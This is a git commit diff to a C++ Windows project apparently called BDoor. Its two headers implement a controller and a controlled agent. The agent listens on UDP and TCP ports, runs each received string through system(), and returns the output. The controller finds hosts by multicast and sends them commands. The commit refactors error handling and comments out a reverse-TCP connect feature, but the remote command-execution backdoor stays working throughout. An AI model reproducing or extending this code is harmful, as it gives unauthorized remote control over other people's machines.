90a1665df4d7742318de247bf3974047661b39dc
error666666666 <141227205+error666666666@users.noreply.github.com>
2024-01-28 15:57:42 +0800

    因技术问题暂时移除反向TCP连接功能

--- include/BDoorControl.h
+++ include/BDoorControl.h
@@ -1,31 +1,25 @@
 #pragma once
 #include <protocol\BDoorProtocol.h>
 #include <other\tools.h>
-struct CommandReValue {
-	int revalue = NULL;
-	vector<string> command = vector<string>();
-	/*CommandReValue operator=(const CommandReValue& crv1) {
-		revalue = crv1.revalue;
-		command = crv1.command;
-		return *this;
-	}*/
-};
-
+#define RETURNSTR "返回"
+#define EXITSTR "退出"
+#define EXIT_VALUE 3
 class Command {
 private:
 	const string name;
 public:
-	virtual CommandReValue Func(string command,string& returnmess) = 0;
-	string GetName() const{ return name; }
+	virtual int Func(string command,string& returnmess) = 0;
+	virtual string GetName() = 0;
 };
 class SearchHost:public Command{
 private:
 	const string name = "主机列表";
 	list<sockaddr_in> host_list;
+	SOCKET group_socket;
 public:
 	SearchHost() {
 		thread([this]() {
-			SOCKET group_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+			group_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
 			sockaddr_in group_addr;
 			group_addr.sin_family = AF_INET;
 			group_addr.sin_addr.s_addr = htonl(INADDR_ANY);
@@ -42,37 +36,38 @@ public:
 				char buf[1024];
 				Result = recvfrom(group_socket, buf, sizeof(buf), 0, (sockaddr*)&sender_addr, &sender_addr_size);
 				if (Result == SOCKET_ERROR) {
-					wprintf(L"recvfrom failed with error %d\n", WSAGetLastError());
+					DebugLog(string("recvfrom failed with error: ")+ to_string(WSAGetLastError()));
 				}
 				else {
 					host_list.push_back(sender_addr);
 					host_list.unique();
-
 				}
 			}
 			}).detach();
 	}
-	CommandReValue Func(string command, string& returnmess) {
-		CommandReValue crv;
+	~SearchHost() {
+		if (group_socket != INVALID_SOCKET) {
+			closesocket(group_socket);
+		}
+	}
+	int Func(string command, string& returnmess) {
 		if (command == "查看主机列表"|| command == "host") {
 			returnmess += "主机列表：\n\n";
 			for (auto e : host_list) {
 				returnmess += string(inet_ntoa(e.sin_addr))+"\n";
 			}
-			crv.revalue = END;
-			return crv;
+			return END;
 		}
 		else if (command == "清空主机列表"|| command == "clear") {
 			host_list.clear();
-			crv.revalue = END;
-			return crv;
+			return END;
 		}
 		else {
-			crv.revalue = NOTCOM;
-			return crv;
+			return NOTCOM;
 		}
 	}
 	list<sockaddr_in>& GetHostList() { return host_list; }
+	string GetName() override { return name; }
 };
 class UDP:public Command{
 private:
@@ -86,43 +81,37 @@ private:
 		Cmd(SOCKET& udp_socket_a, sockaddr_in& udp_addr_a) :udp_socket(udp_socket_a), udp_addr(udp_addr_a) {
 
 		}
-		CommandReValue Func(string command, string& returnmess) {
-			CommandReValue crv;
+		int Func(string command, string& returnmess) {
 			if (step == 0) {
 				if (command == name) {
-					cout << "cmd模式" << endl;
+					DebugLog("cmd模式");
 					step++;
-					crv.revalue = ENTRANCE;
-					return crv;
+					return ENTRANCE;
 				}else {
-					crv.revalue = NOTCOM;
-					return crv;
+					return NOTCOM;
 				}
 			}
 			else if (step == 1) {
-				if (command == "返回") {
-					crv.revalue = END;
-					return crv;
+				if (command == RETURNSTR) {
+					step = 0;
+					return END;
 				}
 				string recvmess;
-				if (udp::SendtoBase64(udp_socket, udp_addr, FormatJson(name,command).dump()) == 0) {
-					returnmess = "发送错误";
-					crv.revalue = ERROR;
-					return crv;
+				if (udp::SendtoBase64(udp_socket, udp_addr, FormatJson(name,command).dump()) < 0) {
+					returnmess = SENDERROR;
+					return ERROR;
 				}
-				cout << "发送" << endl;
 				sockaddr_in sender_addr;
-				if (udp::RecvfromBase64(udp_socket,sender_addr,recvmess) == 0) {
-					returnmess = "接收错误";
-					crv.revalue = ERROR;
-					return crv;
+				if (udp::RecvfromBase64(udp_socket,sender_addr,recvmess)< 0) {
+					returnmess = RECVERROR;
+					return ERROR;
 				}
 				
 				returnmess = DecodeStrInBase64(json::parse(recvmess)[CONTENT]);
-				crv.revalue = ENTRANCE;
-				return crv;
+				return ENTRANCE;
 			}
 		}
+		string GetName() override { return name; }
 	};
 	const string name = "udp";
 	SOCKET udp_socket;
@@ -143,43 +132,42 @@ public:
 		udp_addr.sin_family = AF_INET;
 		udp_addr.sin_port = htons(UDP_PORT);
 	}
-	CommandReValue Func(string command, string& returnmess) override {
-		CommandReValue crv;
+	~UDP() {
+		if (udp_socket != INVALID_SOCKET) {
+			closesocket(udp_socket);
+		}
+	}
+	int Func(string command, string& returnmess) override {
 		if (step == 0) {
 			vector<string> command_split;
 			split_string(command, " ", command_split);
 			if (command_split[0] == name) {
 				if (command_split.size() < 2) {
-					returnmess = "IP地址不能为空";
-					crv.revalue = ERROR;
-					return crv;
+					returnmess = IPEMPTY;
+					return ERROR;
 				}
 				if (check_ip(command_split[1])) {
 					udp_addr.sin_addr.s_addr = inet_addr(command_split[1].data());
-					cout << "udp模式 连接：" << inet_ntoa(udp_addr.sin_addr) << endl;
-					crv.revalue = ENTRANCE;
+					DebugLog(string("udp模式 连接：") + inet_ntoa(udp_addr.sin_addr));
 					step++;
-					return crv;
+					return ENTRANCE;
 				}
 				else {
-					returnmess = "IP地址不正确";
-					crv.revalue = ERROR;
-					return crv;
+					returnmess = IPERROR;
+					return ERROR;
 				}
 			}
 			else {
-				crv.revalue = NOTCOM;
-				return crv;
+				return NOTCOM;
 			}
 		}
 		else if (step == 1) {
-			if (command == "返回" && entrance == nullptr) {
+			if (command == RETURNSTR && entrance == nullptr) {
 				step = 0;
-				crv.revalue = END;
-				return crv;
+				return END;
 			}
-			CommandReValue Result;
 			bool is_com = false;
+			int Result;
 			for (int i = 0; i < command_list.size(); i++) {
 				bool is_entrance = false;
 				if (entrance != nullptr) {
@@ -189,42 +177,35 @@ public:
 				else {
 					Result = command_list[i]->Func(command, returnmess);
 				}
-				if (Result.revalue != NOTCOM) {
+				if (Result != NOTCOM) {
 					is_com = true;
 				}
-				switch (Result.revalue)
+				switch (Result)
 				{
-				case 1:
+				case END:
 					entrance = nullptr;
-					crv.revalue = ENTRANCE;
-					return crv;
-				case 2:
-					entrance = command_list[i];
-					crv.revalue = ENTRANCE;
-					return crv;
-				case 3:
-					for (int j = 0; j < Result.command.size(); j++) {
-						Func(Result.command[j], returnmess);
-					}
-					crv.revalue = ENTRANCE;
-					return crv;
-				case -1:
+					return ENTRANCE;
+				case ENTRANCE:
+					if (!is_entrance) { entrance = command_list[i]; }
+					return ENTRANCE;
+				case ERROR:
 					entrance = nullptr;
-					crv.revalue = ENTRANCE;
-					return crv;
+					return ENTRANCE;
 				default:
 					break;
 				}
 				if (is_entrance) { break; }
 			}
 			if (!is_com) {
-				returnmess = "'" + command + "'" + "udp:不是任何指令";
-				crv.revalue = ENTRANCE;
-				return crv;
+				returnmess = "'" + command + "'" + string(NOT_ANY_COMMAND);
+				return ENTRANCE;
 			}
 		}
 	}
+
 	SOCKET& GetUdpSocket() { return udp_socket; }
+	string GetEntranceName() { return entrance->GetName(); }
+	string GetName() override { return name; }
 };
 class TCP: public Command {
 private:
@@ -239,115 +220,113 @@ private:
 		Cmd(SOCKET &connect_socket_a,sockaddr_in &connect_addr_a):connect_socket(connect_socket_a),connect_addr(connect_addr_a) {
 
 		}
-		CommandReValue Func(string command, string& returnmess) {
-			CommandReValue crv;
+		int Func(string command, string& returnmess) {
 			if (step == 0) {
 				if (command == name) {
 					step++;
-					crv.revalue = ENTRANCE;
-					return crv;
+					return ENTRANCE;
 				}
-				else {
-					crv.revalue = NOTCOM;
-					return crv;
-				}
+				else {return NOTCOM;}
 			}
 			else if (step == 1) {
-				if (command == "返回") {
+				if (command == RETURNSTR) {
 					step = 0;
-					crv.revalue = END;
-					return crv;
+					return END;
 				}
-				connect_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-				connect(connect_socket, (const sockaddr*)&connect_addr, sizeof(connect_addr));
-				tcp::SendBase64(connect_socket, FormatJson(name, command).dump());
+				int Result;
+				Result = tcp::SendBase64(connect_socket, FormatJson(name, command).dump());
+				if (Result == -1) {
+					returnmess = SENDERROR;
+					return ERROR;
+				}
+				else if (Result == 0) {
+					returnmess = DISCONNECT;
+					return ERROR;
+				}
 				string recvmess;
-				tcp::RecvBase64(connect_socket, recvmess);
-				returnmess = DecodeStrInBase64(json::parse(recvmess)[CONTENT]);
-				shutdown(connect_socket, SD_BOTH);
-				if (connect_socket != INVALID_SOCKET) { closesocket(connect_socket); }
-				crv.revalue = ENTRANCE;
-				return crv;
+				Result = tcp::RecvBase64(connect_socket, recvmess);
+				if (Result == -1) {
+					returnmess = RECVERROR;
+					return ERROR;
+				}
+				else if (Result == 0) {
+					returnmess = DISCONNECT;
+					return ERROR;
+				}
+				if (recvmess.empty()) {
+					returnmess = NODATA;
+					return ERROR;
+				}
+				else {
+					returnmess = DecodeStrInBase64(json::parse(recvmess)[CONTENT]);
+					return ENTRANCE;
+				}
 			}	
 		}
+		string GetName() override { return name; }
 	};
 	const string name = "tcp";
-	SOCKET listen_socket, connect_socket;
-	sockaddr_in connect_addr,listen_addr;
+	SOCKET /*listen_socket,*/ connect_socket;
+	sockaddr_in connect_addr/*, listen_addr*/;
 	Command* entrance = nullptr;
 	int step = 0;
 	Cmd cmd = Cmd(connect_socket,connect_addr);
 	vector<Command*> command_list = { &cmd };
-	int CreateListenSocket() {
-		listen_socket = socket(AF_INET,SOCK_STREAM, IPPROTO_TCP);
-		memset(&listen_addr,0,sizeof(listen_addr));
+public:
+	TCP() {
+		/*listen_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+		memset(&listen_addr, 0, sizeof(listen_addr));
 		listen_addr.sin_family = AF_INET;
 		listen_addr.sin_port = htons(TCP_PORT);
 		listen_addr.sin_addr.s_addr = htonl(INADDR_ANY);
-		bindport(listen_socket, (const sockaddr *)&listen_addr, sizeof(listen_addr));
-		return 1;
-	}
-	int ListenConnect() {
-		listen(listen_socket, 5);
-		int connect_addr_len = sizeof(connect_addr);
-		connect_socket = accept(listen_socket, (sockaddr*)&connect_addr,&connect_addr_len);
-		return 1;
-	}
-	/*int Connect(string ip) {
-		connect_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-		memset(&connect_addr, 0, sizeof(connect_addr));
-		connect_addr.sin_family = AF_INET;
-		connect_addr.sin_addr.s_addr = inet_addr(ip.data());
-		connect_addr.sin_port = htons(TCP_PORT);
-		connect(connect_socket, (const sockaddr*)&connect_addr, sizeof(connect_addr));
-		return 1;
-	}*/
-public:
-	TCP() {
-		CreateListenSocket();
+		bindport(listen_socket, (const sockaddr*)&listen_addr, sizeof(listen_addr));*/
 		connect_addr = CreateSockAddrIn(TCP_PORT);
 	}
-	CommandReValue Func(string command,string &returnmess) override {
-		CommandReValue crv;
+	~TCP() {
+		if (connect_socket != INVALID_SOCKET) {
+			closesocket(connect_socket);
+		}
+		/*if (listen_socket != INVALID_SOCKET) {
+			closesocket(listen_socket);
+		}*/
+	}
+	int Func(string command,string &returnmess) override {
 		if (step == 0) {
 			vector <string>command_split;
 			split_string(command, " ", command_split);
-			if (command_split[0] == "reversetcp" || command_split[0] == name) {
+			if (/*command_split[0] == "reversetcp" || */command_split[0] == name) {
 				if (command_split.size() < 2) {
-					returnmess = "IP地址不能为空";
-					crv.revalue = ERROR;
-					return crv;
+					returnmess = IPEMPTY;
+					return ERROR;
 				}
 				if (check_ip(command_split[1])) {
 					connect_addr.sin_addr.s_addr = inet_addr(command_split[1].data());
-					if (command_split[0] == "reversetcp") {
+					/*if (command_split[0] == "reversetcp") {
 						step = 10;
-					}
-					else if (command_split[0] == name) {
+					}*/
+					if (command_split[0] == name) {
 						step++;
 					}
-					crv.revalue = ENTRANCE;
-					return crv;
+					return ENTRANCE;
 				}
 				else {
-					returnmess = "IP地址格式不正确";
-					crv.revalue = ERROR;
-					return crv;
+					returnmess = IPERROR;
+					return ERROR;
 				}
 			}
 			else {
-				crv.revalue = NOTCOM;
-				return crv;
+				return NOTCOM;
 			}
 		}
 		else if (step == 1) {
-			if (command == "返回") {
+			if (command == RETURNSTR&&entrance == nullptr) {
 				step = 0;
-				crv.revalue = END;
-				return crv;
+				return END;
 			}
-			CommandReValue Result;
 			bool is_com = false;
+			int Result;
+			connect_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+			connect(connect_socket, (const sockaddr*)&connect_addr, sizeof(connect_addr));
 			for (int i = 0; i < command_list.size(); i++) {
 				bool is_entrance = false;
 				if (entrance != nullptr) {
@@ -357,54 +336,67 @@ public:
 				else {
 					Result = command_list[i]->Func(command, returnmess);
 				}
-				if (Result.revalue != 0) {
+				if (Result != NOTCOM) {
+					int Result2 = shutdown(connect_socket, SD_BOTH);
+					if (Result2 == SOCKET_ERROR) {
+						DebugLog("shutdown failed with error: " + WSAGetLastError());
+						returnmess = SHUTDOWN_ERROR;
+						return ERROR;
+					}
+					if (connect_socket != INVALID_SOCKET) {
+						Result2 = closesocket(connect_socket);
+						if (Result2 == SOCKET_ERROR) {
+							DebugLog("closesocket failed with error: " + WSAGetLastError());
+							returnmess = COLSESOCKET_ERROR;
+							return ERROR;
+						}
+					}
 					is_com = true;
 				}
-				switch (Result.revalue)
+				switch (Result)
 				{
-				case 1:
+				case END:
 					entrance = nullptr;
-					crv.revalue = ENTRANCE;
-					return crv;
-				case 2:
-					entrance = command_list[i];
-					crv.revalue = ENTRANCE;
-					return crv;
-				case 3:
-					for (int j = 0; j < Result.command.size(); j++) {
-						Func(Result.command[j], returnmess);
-					}
-					crv.revalue = ENTRANCE;
-					return crv;
-				case -1:
+					return ENTRANCE;
+				case ENTRANCE:
+					if(!is_entrance){entrance = command_list[i];}
+					return ENTRANCE;
+				case ERROR:
 					entrance = nullptr;
-					crv.revalue = ENTRANCE;
-					return crv;
+					return ENTRANCE;
 				default:
 					break;
 				}
 				if (is_entrance) { break; }
 			}
 			if (!is_com) {
-				returnmess = "'" + command + "'" + "不是任何指令";
-				crv.revalue = NOTCOM;
-				return crv;
+				returnmess = "'" + command + "'" + NOT_ANY_COMMAND;
+				return NOTCOM;
 			}
 		}	
-
+		/*
 		if (step == 10) {
-			if (command == "返回") {
+			if (command == RETURNSTR) {
 				step = 0;
-				crv.revalue = END;
-				return crv;
+				return END;
 			}
 			SOCKET reverse_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
 			sockaddr_in addr = CreateSockAddrIn(REVERSE_PORT);
 			bindport(reverse_socket, (const sockaddr*)&addr, sizeof(addr));
 			sockaddr_in target_addr = CreateSockAddrIn(inet_ntoa(connect_addr.sin_addr), REVERSE_PORT);
-			udp::SendtoBase64(reverse_socket, target_addr, FormatJson(name, "reverse connect"));
-			ListenConnect();
-			CommandReValue Result;
+			int Result = udp::SendtoBase64(reverse_socket, target_addr, FormatJson(name, REVERSECONNECT).dump());
+			if (Result == -1) {
+				DebugLog(SENDERROR);
+				return ERROR;
+			}
+			else if (Result == 0) {
+				DebugLog(DISCONNECT);
+				return ERROR;
+			}
+			listen(listen_socket, 5);
+			sockaddr_in addr1;
+			int addr1_len = sizeof(addr1);
+			connect_socket = accept(listen_socket, (sockaddr*)&addr1, &addr1_len);
 			bool is_com = false;
 			for (int i = 0; i < command_list.size(); i++) {
 				bool is_entrance = false;
@@ -415,41 +407,61 @@ public:
 				else {
 					Result = command_list[i]->Func(command, returnmess);
 				}
-				if (Result.revalue != 0) {
+				if (Result != 0) {
+					int Result2 = shutdown(reverse_socket, SD_BOTH);
+					if (Result2 == SOCKET_ERROR) {
+						DebugLog(string("reverse_socket shutdown failed with error: ") + to_string(WSAGetLastError()));
+						returnmess = SHUTDOWN_ERROR;
+						return ERROR;
+					}
+					if (reverse_socket != INVALID_SOCKET) {
+						Result2 = closesocket(reverse_socket);
+						if (Result2 == SOCKET_ERROR) {
+							DebugLog(string("reverse_socket closesocket failed with error: ") + to_string(WSAGetLastError()));
+							returnmess = COLSESOCKET_ERROR;
+							return ERROR;
+						}
+					}
+					Result2 = shutdown(connect_socket, SD_BOTH);
+					if (Result2 == SOCKET_ERROR) {
+						DebugLog(string("connect_socket shutdown failed with error: ") + to_string(WSAGetLastError()));
+						returnmess = SHUTDOWN_ERROR;
+						//return ERROR;
+					}
+					if (connect_socket != INVALID_SOCKET) {
+						Result2 = closesocket(connect_socket);
+						if (Result2 == SOCKET_ERROR) {
+							DebugLog(string("connect_socket closesocket failed with error: ") + to_string(WSAGetLastError()));
+							returnmess = COLSESOCKET_ERROR;
+							return ERROR;
+						}
+					}
 					is_com = true;
 				}
-				switch (Result.revalue)
+				switch (Result)
 				{
-				case 1:
+				case END:
 					entrance = nullptr;
-					crv.revalue = ENTRANCE;
-					return crv;
-				case 2:
-					entrance = command_list[i];
-					crv.revalue = ENTRANCE;
-					return crv;
-				case 3:
-					for (int j = 0; j < Result.command.size(); j++) {
-						Func(Result.command[j], returnmess);
-					}
-					crv.revalue = ENTRANCE;
-					return crv;
-				case -1:
+					return ENTRANCE;
+				case ENTRANCE:
+					if (!is_entrance) { entrance = command_list[i]; }
+					return ENTRANCE;
+				case ERROR:
 					entrance = nullptr;
-					crv.revalue = ENTRANCE;
-					return crv;
+					return ENTRANCE;
 				default:
 					break;
 				}
 				if (is_entrance) { break; }
 			}
 			if (!is_com) {
-				returnmess = "'" + command + "'" + "不是任何指令";
-				crv.revalue = NOTCOM;
-				return crv;
+				returnmess = "'" + command + "'" + NOT_ANY_COMMAND;
+				return NOTCOM;
 			}
-		}
+		}*/
 	}
+	string GetEntranceName() { return entrance->GetName(); }
+	string GetName() override { return name; }
 };
 class BDoorControl {
 private:
@@ -458,16 +470,18 @@ private:
 	UDP udp = UDP();
 	TCP tcp = TCP();
 	vector<Command*> command_list = {&search_host,&udp,&tcp};
-	
-public:
 	Command *entrance = nullptr;
+public:
+	
 	int EnterCommand(string command, string& returnmess) {
-		CommandReValue Result;
-		bool is_com = false;
+		
 		if (command.empty()) {
 			returnmess = "";
 			return 0;
 		}
+		if (command == EXITSTR) { return EXIT_VALUE; }
+		bool is_com = false;
+		int Result;
 		for (int i = 0; i < command_list.size(); i++) {
 			bool is_entrance = false;
 			if (entrance != nullptr) {
@@ -477,25 +491,18 @@ public:
 			else {
 				Result = command_list[i]->Func(command, returnmess);
 			}
-			if (Result.revalue != 0) {
+			if (Result != 0) {
 				is_com = true;
 			}
-			switch (Result.revalue)
+			switch (Result)
 			{
-			case 1:
+			case END:
 				entrance = nullptr;
 				return 1;
-			case 2:
-				if (!is_entrance) {
-					entrance = command_list[i];
-				}
+			case ENTRANCE:
+				if (!is_entrance) {entrance = command_list[i];}
 				return 1;
-			case 3:
-				for (int j = 0; j < Result.command.size(); j++) {
-					EnterCommand(Result.command[j], returnmess);
-				}
-				return 1;
-			case -1:
+			case ERROR:
 				entrance = nullptr;
 				return -1;
 			default:
@@ -504,10 +511,11 @@ public:
 			if(is_entrance){break;}
 		}
 		if (!is_com) {
-			returnmess = "'" + command + "'" + "entercommand:不是任何指令";
+			returnmess = "'" + command + "'" + NOT_ANY_COMMAND;
 			return 0;
 		}
 	}
+	string GetEntranceName() {return entrance->GetName();}
 	~BDoorControl() {
 		WSACleanup();
 	}
--- include/BDoorControlled.h
+++ include/BDoorControlled.h
@@ -4,6 +4,7 @@
 #include<vector>
 #include <other\tools.h>
 #define CMD_RETURN_TXT_NAME "cmd_return.txt"
+#define CMDERROR "cmd命令执行失败"
 class Command {
 private:
 	const string name = "command";
@@ -19,52 +20,33 @@ public:
 	virtual string GetName() = 0;
 };
 int run_cmd_with_txt(string cmd_command, string& mess) {
-
-	/*平替方案*/
-
 	fstream fst;
 	fst.open(CMD_RETURN_TXT_NAME, ios::trunc | ios::out);
 	if (!fst.is_open()) {
-
-		cout << "文件打开失败" << endl;
-		return 0;
-
+		DebugLog("文件打开失败");
+		return -1;
 	}
-	else {
-
-		cout << "文件打开成功" << endl;
-
-	}
+	else {DebugLog("文件打开成功");}
 	fst.close();
-
 	cmd_command += string(" >> ") + CMD_RETURN_TXT_NAME;
-	system(cmd_command.data());
-
+	if (system(cmd_command.data()) == -1) {
+		mess = CMDERROR;
+		DebugLog("cmd命令执行失败");
+		return -1;
+	}
 	ifstream ifs;
 	ifs.open(CMD_RETURN_TXT_NAME, ios::in);
 	string remess = "\n";
 	string buf;
-	while (getline(ifs, buf)) {
-
-		remess += buf + string("\n");
-
-	}
+	while (getline(ifs, buf)) {remess += buf + string("\n");}
 	mess = remess;
 	ifs.close();
-	if (remove(string(CMD_RETURN_TXT_NAME).data()) == 0) {
-
-		cout << "成功删除文件" << endl;
-
-	}
+	if (remove(string(CMD_RETURN_TXT_NAME).data()) == 0) {DebugLog("成功删除文件");}
 	else {
-
-		cout << "无法删除文件" << endl;
-		return 0;
-
+		DebugLog("无法删除文件");
+		return -1;
 	}
-
 	return 1;
-
 }
 class CallHost : public Command{
 private:
@@ -103,14 +85,17 @@ private:
 		int Func(string command) override {
 			json command_json = json::parse(command);
 			if (command_json[COMMANDNAME] == name) {
-				cout << "cmd调用" << endl;
+				DebugLog("cmd调用");
 				string returnmess;
-				run_cmd_with_txt(command_json[CONTENT], returnmess);
-				udp::SendtoBase64(udp_socket, udp_addr, FormatJson(name,EncodeStrInBase64(returnmess)).dump());
-				cout << returnmess << endl;
+				if(run_cmd_with_txt(command_json[CONTENT], returnmess) == -1){
+					returnmess = CMDERROR;
+				}
+				int Result = udp::SendtoBase64(udp_socket, udp_addr, FormatJson(name,EncodeStrInBase64(returnmess)).dump());
+				if (Result == -1) { DebugLog(SENDERROR); }
+				else if (Result == 0) { DebugLog(DISCONNECT); }
+				DebugLog(returnmess);
 				return 1;
 			}
-			cout << command_json[COMMANDNAME] << endl;
 			return 0;
 		}
 		string GetName()override { return name; }
@@ -122,17 +107,20 @@ private:
 	vector<RemoteCommand*> remote_command_list = { &cmd };
 public:
 	int Func()override {
-		cout << "UDP线程启动" << endl;
+		DebugLog("UDP线程启动");
 		udp_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
 		udp_addr.sin_family = AF_INET;
 		udp_addr.sin_port = htons(UDP_PORT);
 		udp_addr.sin_addr.s_addr = htonl(INADDR_ANY);
 		bindport(udp_socket, (const sockaddr*)&udp_addr, sizeof(udp_addr));
 		while (true) {
+			int Result;
 			string recvmess;
-			cout << "等待接收" << endl;
-			udp::RecvfromBase64(udp_socket, sender_addr, recvmess);
-			cout << inet_ntoa(sender_addr.sin_addr) << "/UDP>" << recvmess << endl;
+			DebugLog("等待接收");
+			Result = udp::RecvfromBase64(udp_socket, sender_addr, recvmess);
+			if (Result == -1) { DebugLog(RECVERROR); }
+			else if (Result == 0) { DebugLog(DISCONNECT); }
+			DebugLog(string(inet_ntoa(sender_addr.sin_addr)) + "/UDP>" + recvmess);
 			for (int i = 0; i < remote_command_list.size(); i++) {
 				remote_command_list[i]->Func(recvmess);
 			}
@@ -153,12 +141,20 @@ private:
 		int Func(string command)override {
 			json command_json = json::parse(command);	
 			if (command_json[COMMANDNAME] == name) {
-				cout << "cmd调用" << endl;
 				string returnmess;
-				run_cmd_with_txt(command_json[CONTENT], returnmess);
-				string sendmess = FormatJson(name, EncodeStrInBase64( returnmess)).dump();
-				tcp::SendBase64(connect_socket, sendmess);
-				cout << returnmess << endl;
+				if (run_cmd_with_txt(command_json[CONTENT], returnmess) == -1) {
+					returnmess = CMDERROR;
+				}
+				int Result = tcp::SendBase64(connect_socket, FormatJson(name, EncodeStrInBase64(returnmess)).dump());
+				if (Result == -1) {
+					DebugLog(SENDERROR);
+					return -1;
+				}
+				else if (Result == 0) {
+					DebugLog(DISCONNECT);
+					return -1;
+				}
+				DebugLog(returnmess);
 				return 1;
 			}
 			return 0;
@@ -171,30 +167,39 @@ private:
 	vector<RemoteCommand*> remote_command_list = { &cmd };
 public:
 	int Func() override{
-		cout << "TCP线程启动" << endl;
+		DebugLog("TCP线程启动");
 		SOCKET listen_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 		sockaddr_in listen_addr;
 		listen_addr.sin_family = AF_INET;
 		listen_addr.sin_port = htons(TCP_PORT);
 		listen_addr.sin_addr.s_addr = htonl(INADDR_ANY);
 		bindport(listen_socket, (const sockaddr*)&listen_addr, sizeof(listen_addr));
-		thread(&TCP::ReverseConnect,this).detach();
+		//thread(&TCP::ReverseConnect,this).detach();
+		listen(listen_socket,5);
 		while (true) {
-			listen(listen_socket,5);
 			sockaddr_in connect_addr;
 			int connect_addr_len = sizeof(connect_addr);
 			connect_socket = accept(listen_socket, (sockaddr*)&connect_addr, &connect_addr_len);
-			cout << inet_ntoa(connect_addr.sin_addr) << endl;
+			DebugLog(inet_ntoa(connect_addr.sin_addr));
 			string recvmess;
-			tcp::RecvBase64(connect_socket, recvmess);
-			cout << inet_ntoa(connect_addr.sin_addr) << "/TCP>" << recvmess << endl;
+			int Result = tcp::RecvBase64(connect_socket, recvmess);
+			if (Result == -1) {
+				DebugLog(RECVERROR);
+				continue;
+			}
+			else if (Result == 0) {
+				DebugLog(DISCONNECT);
+				continue;
+			}
+			DebugLog(string(inet_ntoa(connect_addr.sin_addr)) + "/TCP>" + recvmess);
 			for (int i = 0; i < remote_command_list.size(); i++) {
 				remote_command_list[i]->Func(recvmess);
 			}
 		}
 	}
-	int ReverseConnect() {
-		cout << "反向TCP线程启动" << endl;
+	/*int ReverseConnect() {
+		int Result;
+		DebugLog("反向TCP线程启动");
 		SOCKET reverse_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
 		sockaddr_in reverse_addr;
 		reverse_addr.sin_family = AF_INET;
@@ -202,29 +207,45 @@ public:
 		reverse_addr.sin_addr.s_addr = htonl(INADDR_ANY);
 		bindport(reverse_socket, (const sockaddr *)&reverse_addr, sizeof(reverse_addr));
 		while (true) {
-			sockaddr_in sender_addr;
 			string recvmess;
-			udp::RecvfromBase64(reverse_socket, sender_addr, recvmess);
-			cout << inet_ntoa(sender_addr.sin_addr) << ": 反向连接请求" << endl;
+			sockaddr_in sender_addr;
+			Result = udp::RecvfromBase64(reverse_socket, sender_addr, recvmess);
+			if (Result == -1) {
+				DebugLog(RECVERROR);
+				continue;
+			}
+			else if (Result == 0) {
+				DebugLog(DISCONNECT); 
+				continue;
+			}
 			json requestmess;
 			requestmess.parse(recvmess);
 			if (requestmess[COMMANDNAME] == name) {
-				if (requestmess[CONTENT] == "reverse_connect") {
+				if (requestmess[CONTENT] == REVERSECONNECT) {
+					DebugLog(string(inet_ntoa(sender_addr.sin_addr)) + ": 反向连接请求");
 					connect_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 					sockaddr_in addr;
 					addr.sin_family = AF_INET;
 					addr.sin_port = htons(TCP_PORT);
 					addr.sin_addr.s_addr = inet_addr(inet_ntoa(sender_addr.sin_addr));
 					connect(connect_socket, (const sockaddr*)&addr, sizeof(addr));
-					tcp::RecvBase64(connect_socket, recvmess);
-					cout << inet_ntoa(addr.sin_addr) << "/TCP>" << recvmess << endl;
+					int Result = tcp::RecvBase64(connect_socket, recvmess);
+					if (Result == -1) {
+						DebugLog(RECVERROR);
+						return ERROR;
+					}
+					else if (Result == 0) {
+						DebugLog(DISCONNECT);
+						return ERROR;
+					}
+					DebugLog(string(inet_ntoa(addr.sin_addr)) + "/TCP>" + recvmess);
 					for (int i = 0; i < remote_command_list.size(); i++) {
 						remote_command_list[i]->Func(recvmess);
 					}
 				}
 			}
 		}	
-	}
+	}*/
 	string GetName()override { return name; }
 };
 class BDoorControlled {
